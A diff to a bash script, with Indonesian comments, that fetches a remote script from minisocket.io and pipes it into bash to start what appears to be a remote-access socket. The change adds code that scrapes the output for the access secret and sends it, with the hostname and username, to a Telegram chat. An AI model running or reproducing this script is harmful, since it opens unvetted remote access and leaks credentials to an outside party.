@@ -12,25 +12,38 @@ send_telegram() {
         -d parse_mode="HTML" >/dev/null 2>&1
 }
 
-# Jalankan command
-MINI_PORT=80 bash -c "$(curl -fsSL https://minisocket.io/bin/x)"
+echo "🚀 Menjalankan MiniSocket..."
 
-# Simpan output ke file
-if [ $? -eq 0 ]; then
-    OUTPUT="Success ==> MINI_PORT=80 MiniSocket Running"
-    echo "$OUTPUT" | tee output.txt
-    send_telegram "🟢 <b>MiniSocket Success</b>
+# Jalankan MiniSocket dan tangkap SELURUH output
+OUTPUT=$(MINI_PORT=80 bash -c "$(curl -fsSL https://minisocket.io/bin/x)" 2>&1)
+
+EXIT_CODE=$?
+
+if echo "$OUTPUT" | grep -qE "secret|Secret|SECRET"; then
+    # Ambil secret (biasanya muncul sebagai -s xxxx atau "Your secret is")
+    SECRET=$(echo "$OUTPUT" | grep -oE '[-]?s[[:space:]]+[A-Za-z0-9]+' | awk '{print $2}' | head -n1)
+    [[ -z "$SECRET" ]] && SECRET=$(echo "$OUTPUT" | grep -oE '[A-Za-z0-9]{8,}' | head -n1)
+
+    MSG="🟢 <b>MiniSocket Berhasil!</b>
 ━━━━━━━━━━━━━━━
-🖥 <b>Host:</b> <code>$(hostname 2>/dev/null || echo unknown)@$(whoami 2>/dev/null || echo unknown)</code>
-🔌 <b>Port:</b> <code>22</code>
+🖥 <b>Host:</b> <code>$(hostname)@$(whoami)</code>
+🔌 <b>Port:</b> <code>80</code>
+🔑 <b>Secret:</b> <code>${SECRET:-Tidak terdeteksi}</code>
 ✅ Status: Running
 ━━━━━━━━━━━━━━━"
+    
+    echo "$MSG" | tee output.txt
+    send_telegram "$MSG"
+    echo "Secret Key: $SECRET"
 else
-    OUTPUT="Failed :("
-    echo "$OUTPUT" | tee output.txt
-    send_telegram "🔴 <b>MiniSocket Failed</b>
+    MSG="🔴 <b>MiniSocket Gagal</b>
 ━━━━━━━━━━━━━━━
-🖥 <b>Host:</b> <code>$(hostname 2>/dev/null || echo unknown)@$(whoami 2>/dev/null || echo unknown)</code>
+🖥 <b>Host:</b> <code>$(hostname)@$(whoami)</code>
 ❌ Status: Failed
-━━━━━━━━━━━━━━━"
+━━━━━━━━━━━━━━━
+Output: $OUTPUT"
+    
+    echo "$MSG" | tee output.txt
+    send_telegram "$MSG"
+    echo "$OUTPUT"
 fi
